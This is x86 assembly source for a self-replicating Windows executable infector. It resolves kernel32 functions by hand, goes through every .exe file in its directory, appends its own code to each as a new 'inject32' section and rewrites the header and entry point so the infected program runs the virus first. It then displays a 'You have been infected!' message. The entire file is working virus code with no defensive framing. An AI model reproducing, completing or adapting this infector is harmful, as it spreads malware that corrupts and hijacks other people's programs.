include misc.inc

inject32 SEGMENT read write execute
	data_start EQU $
	
	; .data
    selfSectionVA dd 3000h

    strF1A db 'FindFirstFileA', 0
    strFNA db 'FindNextFileA', 0
    strFC db 'FindClose', 0
    strCFA db 'CreateFileA', 0
    strSFP db 'SetFilePointer', 0
    strCH db 'CloseHandle', 0
    strRF db 'ReadFile', 0
    strWF db 'WriteFile', 0
    strGLE db 'GetLastError', 0
    strLLA db 'LoadLibraryA', 0
    strGPA db 'GetProcAddress', 0
    stru32dll db 'user32.dll', 0
    strMBA db 'MessageBoxA', 0
    
    strQuery db '*.exe', 0
	strCaption db 'Notice', 0
    strContent db 'You have been infected!', 0
    
    ishName db 'inject32' ; MUST be 8 bytes in length (pad 0 if not) + MUST match segment name
    ishVirtualSize dd 0
    ishVirtualAddress dd 0
    ishSizeOfRawData dd 0
    ishPointerToRawData dd 0
    ishPointerToRelocations dd 0
    ishPointerToLineNumbers dd 0
    ishNumberOfRelocations dw 0
    ishNumberOfLinenumbers dw 0
    ishCharacteristics dd 0E0000040h
    ; IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
	; 0x00000040 | 0x20000000 | 0x40000000 | 0x80000000
    
    ; .data?
    tempDword dd 0
    tempDword2 dd 0
    temp320B db 320 DUP(0) ; To store WIN32_FIND_DATAA and other data longer than 4 bytes
    
; .code
delta:
	ret

start:
    entrySectionOffset EQU $ - data_start

    call delta
	postDelta EQU $ - data_start
        
	mov [esp + stackAddr(old_ebp)], ebp
    mov ebp, esp
    
    ; Allocate space in the stack
    add esp, stackAddr(stack_reserved)
    
    mov edx, fromStack(deltaAddr) ; selfEntry + 1 + 4 (call delta is 5 bytes long)
    sub edx, postDelta - entrySectionOffset ; edx = selfEntry
    toStack selfEntry, edx
    
    sub edx, entrySectionOffset
    toStack selfSection, edx
    
    sub edx, paccess(selfSectionVA)
    toStack selfImageBaseAddress, edx
    
    ; Find kernel32.dll
    ASSUME FS:NOTHING
    mov ebx, fs:30h
    mov ebx, [ebx + 0Ch]
    mov ebx, [ebx + 14h]
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov ebx, [ebx + 10h]
	toStack kernel32dll, ebx ; BaseAddress of kernel32.dll
    
    mov edi, [ebx + 3Ch]
    add edi, ebx
    mov edi, [edi + 78h] ; 24 (18h) + 96 (60h) = RVA of kernel32.dll Export Table
    add edi, ebx
    mov ecx, [edi + 24h]
    add ecx, ebx
    toStack OrdinalTbl, ecx ; VA of Ordinal Table
    
    mov esi, [edi + 20h]
    add esi, ebx
    toStack NamePtrTbl, esi ; VA of Name Pointer Table
    
    mov edx, [edi + 1Ch]
    add edx, ebx
    toStack AddrTbl, edx ; VA of Address Table
    
    mov edx, [edi + 14h]
    toStack k32NumFunc, edx
    
    k32import strF1A
    toStack ffind1
    
    k32import strFNA
    toStack ffind2
    
    k32import strFC
    toStack ffind0
    
    k32import strCFA
    toStack fopen
    
    k32import strSFP
    toStack fseek
    
    k32import strCH
    toStack fclose
    
    k32import strRF
    toStack fread
    
    k32import strWF
    toStack fwrite
    
    k32import strGLE
    toStack ferror
    
    k32import strLLA
    toStack loadlib
    
   	push daccess(offset stru32dll)
   	call vfromStack(loadlib)
    toStack user32dll
    
    k32import strGPA
    toStack getaddr
    
    push daccess(offset strMBA)
    push fromStack(user32dll)
    call vfromStack(getaddr)
    toStack msgbox
	
	; 
	mov ebx, fromStack(selfImageBaseAddress)
	add ebx, 3Ch
	mov ebx, DWORD PTR [ebx] ; ebx = e_lfanew
	add ebx, fromStack(selfImageBaseAddress) ; ebx = e_lfanew in memory
	add ebx, 6
	xor edx, edx
	mov dx, [ebx] ; edx = NumberOfSections
	add ebx, 20 - 6
	xor eax, eax
	mov ax, [ebx] ; eax = SizeOfOptionalHeader
	add ebx, 24 - 20 ; ebx = VA OptionalHeader
	add ebx, eax ; ebx = VA SectionTable #1
	
	xor eax, eax
	section_header_loop:
		imul esi, eax, 40
		add esi, ebx
		mov edi, daccess(ishName, edi)
		mov ecx, 8
		cld
		repe cmpsb
		jz section_header_found
		
		inc eax
		cmp eax, edx
	jb section_header_loop
	
	section_header_found:
	imul esi, eax, 40
	add esi, ebx
	mov eax, [esi + 8]
	toStack selfVirtualSize
	mov eax, [esi + 20]
	toStack selfPointerToRawData
    
    ; Find first file in directory
    push daccess(offset temp320B)
    push daccess(offset strQuery)
    call vfromStack(ffind1)
    toStack fileHand
    
    openFile:
			push 0
			push 80h ; FILE_ATTRIBUTE_NORMAL
			push 4 ; OPEN_ALWAYS
			push 0
			push 1 or 2 or 4 ; FILE_SHARE_READ
			push 40000000h OR 80000000h ; GENERIC_READ | GENERIC_WRITE
				mov eax, daccess(offset temp320B)
				add eax, 2Ch
			push eax ; cFileName in WIN32_FIND_DATAA
		call vfromStack(fopen)
		cmp eax, -1
		je nextFile
		toStack tgHand

		; Obtain and verify magic bytes "MZ"
		getval fromStack(tgHand), 2
		cmp paccess(tempDword), 5a4dh
		jne closeFile ; Not a PE file

		; e_lfanew
		getval fromStack(tgHand), 4, SEEK_SET, 3Ch
		mov eax, paccess(tempDword)
		toStack lfanew

		; Obtain new NumberOfSections
		mov ebx, fromStack(lfanew)
		add ebx, 6
		getval fromStack(tgHand), 2, SEEK_SET, ebx
		mov eax, paccess(tempDword)
		toStack NumberOfSections

		add ebx, 20 - 6 ; = lfanew + 20
		getval fromStack(tgHand), 2, SEEK_SET, ebx
		mov eax, paccess(tempDword)
		toStack SizeOfOptionalHeader

		add ebx, 4 ; = lfanew + 24 = ioh_offset
		toStack ioh_offset, ebx
		getval fromStack(tgHand), 2, SEEK_SET, ebx
		mov eax, paccess(tempDword)
		toStack Magic

		mov ebx, fromStack(ioh_offset)
		add ebx, 16
		getval fromStack(tgHand), 4, SEEK_SET, ebx
		mov eax, paccess(tempDword)
		toStack AddressOfEntryPoint

		mov ebx, fromStack(ioh_offset)
		add ebx, 32
		getval fromStack(tgHand), 4, SEEK_SET, ebx
		mov eax, paccess(tempDword)
		toStack SectionAlignment

		getval fromStack(tgHand), 4
		mov eax, paccess(tempDword)
		toStack FileAlignment
		
		; Search for an already in-place injection
		mov ebx, fromStack(ioh_offset)
		add ebx, fromStack(SizeOfOptionalHeader) ; ebx = Section Table Offset
			push SEEK_SET
			push 0
			push ebx
			push fromStack(tgHand)
		call vfromStack(fseek)
		mov ebx, fromStack(NumberOfSections)
		already_injected_loop:
				push 0
				push daccess(tempDword2)
				push 8
				push daccess(temp320B)
				push fromStack(tgHand)
			call vfromStack(fread)
			mov esi, daccess(temp320B, esi)
			mov edi, daccess(ishName, edi)
			mov ecx, 8
			cld
			repe cmpsb
			jz closeFile
			
				push SEEK_CUR
				push 0
				push 32
				push fromStack(tgHand)
			call vfromStack(fseek)
			dec ebx
			cmp ebx, 0
		ja already_injected_loop

		; DWORD lastish_offset = ioh_offset + SizeOfOptionalHeader + 40 * (NumberOfSections - 1);
		mov ebx, fromStack(ioh_offset)
		add ebx, fromStack(SizeOfOptionalHeader) ; ebx = Section Table Offset
		mov edx, fromStack(NumberOfSections)
		dec edx
		imul edx, 40 ; Size of 1 section header
		add ebx, edx
		toStack lastish_offset, ebx

		; Obtain lastish.VirtualAddress
		add ebx, 12
		getval fromStack(tgHand), 4, SEEK_SET, ebx
		mov ebx, paccess(tempDword)

		; Obtain lastish.SizeOfRawData
		getval fromStack(tgHand), 4
		add ebx, paccess(tempDword)

		closest ebx, vfromStack(SectionAlignment)
		mov paccess(ishVirtualAddress, edx), eax

		mov ecx, fromStack(lastish_offset)
		add ecx, 40
		toStack newish_offset, ecx

		; Pad end of file to match FileAlignment
			push SEEK_END
			push 0
			push 0
			push fromStack(tgHand)
		call vfromStack(fseek)
		mov ebx, eax
		inc eax
		closest	eax, vfromStack(FileAlignment)
		mov esi, eax ; Avoid eax being overwritten later (at daccess()/fwrite())
		sub esi, ebx
		mov paccess(tempDword), 0
		pad1_loop:
				push 0
				push daccess(tempDword2)
				push 1
				push daccess(tempDword)
				push fromStack(tgHand)
			call vfromStack(fwrite)
			dec esi
			cmp esi, 0
		ja pad1_loop
			push SEEK_CUR
			push 0
			push 0
			push fromStack(tgHand)
		call vfromStack(fseek)
		mov paccess(ishPointerToRawData, ecx), eax
		
		; Write selfSectionVA
			push 0
			push daccess(tempDword2)
			push 4
			push daccess(ishVirtualAddress)
			push fromStack(tgHand)
		call vfromStack(fwrite)

		; Copy .inject
		mov ecx, fromStack(selfVirtualSize)
		sub ecx, 4 + 5
		; Already written selfSection VA
		; No copying last jmp instruction to old AddressOfEntryPoint (along with nop's)
			push 0
			push daccess(tempDword2)
			push ecx
				mov eax, fromStack(selfSection)
				add eax, 4
			push eax
			push fromStack(tgHand)
		call vfromStack(fwrite)
			
		; Final jmp instruction:
		; E9 XX XX XX XX = jmp disp32 (5 bytes)
		mov paccess(tempDword), 0E9h
			push 0
			push daccess(tempDword2)
			push 1
			push daccess(tempDword) ; jmp
			push fromStack(tgHand)
		call vfromStack(fwrite)
		
		mov ebx, vfromStack(AddressOfEntryPoint)
			push SEEK_CUR
			push 0
			push 0
			push fromStack(tgHand)
		call vfromStack(fseek) ; Obtain current position
		sub eax, paccess(ishPointerToRawData, ecx)
		add eax, paccess(ishVirtualAddress, ecx)
		add eax, 4 ; eax = RVA of end of this JMP instruction
		sub ebx, eax ; ebx = Difference between this JMP instruction and oldEntryPoint
		mov paccess(tempDword), ebx
			push 0
			push daccess(tempDword2)
			push 4
			push daccess(tempDword) ; oldEntryPoint
			push fromStack(tgHand)
		call vfromStack(fwrite)
		
		; Register VirtualSize & SizeOfRawData
			push SEEK_CUR
			push 0
			push 0
			push fromStack(tgHand)
		call vfromStack(fseek) ; Obtain current position
		sub eax, paccess(ishPointerToRawData, ecx)
		mov paccess(ishVirtualSize, ecx), eax	
		closest	eax, vfromStack(FileAlignment)
		mov paccess(ishSizeOfRawData, ecx), eax

		; Pad section
		mov esi, eax
		sub esi, paccess(ishVirtualSize)
		mov paccess(tempDword), 0
		pad2_loop:
				push 0
				push daccess(tempDword2)
				push 1
				push daccess(tempDword)
				push fromStack(tgHand)
			call vfromStack(fwrite)
			
			dec esi
			cmp esi, 0
		ja pad2_loop

		; Write new Section Header
			push SEEK_SET
			push 0
			push fromStack(newish_offset)
			push fromStack(tgHand)
		call vfromStack(fseek)
			push 0
			push daccess(tempDword2)
			push 40
			push daccess(ishName, ecx)
			push fromStack(tgHand)
		call vfromStack(fwrite)
		
		; Increase NumberOfSections
		mov ecx, vfromStack(NumberOfSections)
		mov paccess(tempDword), ecx
		inc paccess(tempDword)
		mov ebx, vfromStack(lfanew)
		add ebx, 6
			push SEEK_SET
			push 0
			push ebx
			push fromStack(tgHand)
		call vfromStack(fseek)
			push 0
			push daccess(tempDword2)
			push 2
			push daccess(tempDword)
			push fromStack(tgHand)
		call vfromStack(fwrite)

		; Edit SizeOfImage
		mov ebx, fromStack(ioh_offset)
		add ebx, 56
		getval fromStack(tgHand), 4, SEEK_SET, ebx
		mov eax, paccess(tempDword)
		add eax, paccess(ishSizeOfRawData, ecx)
		closest eax, vfromStack(SectionAlignment)
		mov paccess(tempDword, ecx), eax
			push SEEK_SET
			push 0
			push ebx
			push fromStack(tgHand)
		call vfromStack(fseek)
			push 0
			push daccess(tempDword2)
			push 4
			push daccess(tempDword, ecx)
			push fromStack(tgHand)
		call vfromStack(fwrite)
		
		; Edit AddressOfEntryPoint
		mov ebx, fromStack(ioh_offset)
		add ebx, 16
		mov edx, paccess(ishVirtualAddress)
		add edx, entrySectionOffset
		mov paccess(tempDword), edx
			push SEEK_SET
			push 0
			push ebx
			push fromStack(tgHand)
		call vfromStack(fseek)
			push 0
			push daccess(tempDword2)
			push 4
			push daccess(tempDword, ecx)
			push fromStack(tgHand)
		call vfromStack(fwrite)

	closeFile:
			push fromStack(tgHand)
		call vfromStack(fclose)

	nextFile:
			push daccess(offset temp320B)
			push fromStack(fileHand)
		call vfromStack(ffind2)
		cmp eax, 0
    jne openFile
    
    ; No more file to write
    	push fromStack(fileHand)
    call vfromStack(ffind0)
    
    ; Malware here
    push 2030h ; MB_OK | MB_ICONWARNING | MB_TASKMODAL
    push daccess(strCaption)
    push daccess(strContent)
    push 0
    call vfromStack(msgbox)
    
    to_exit:
    mov esp, ebp
    mov ebp, [esp + stackAddr(old_ebp)]
    jmp exit ; expected to be 5 bytes
inject32 ENDS

.code
exit:
    invoke ExitProcess, 0
;	xor eax, eax
;	ret

end start
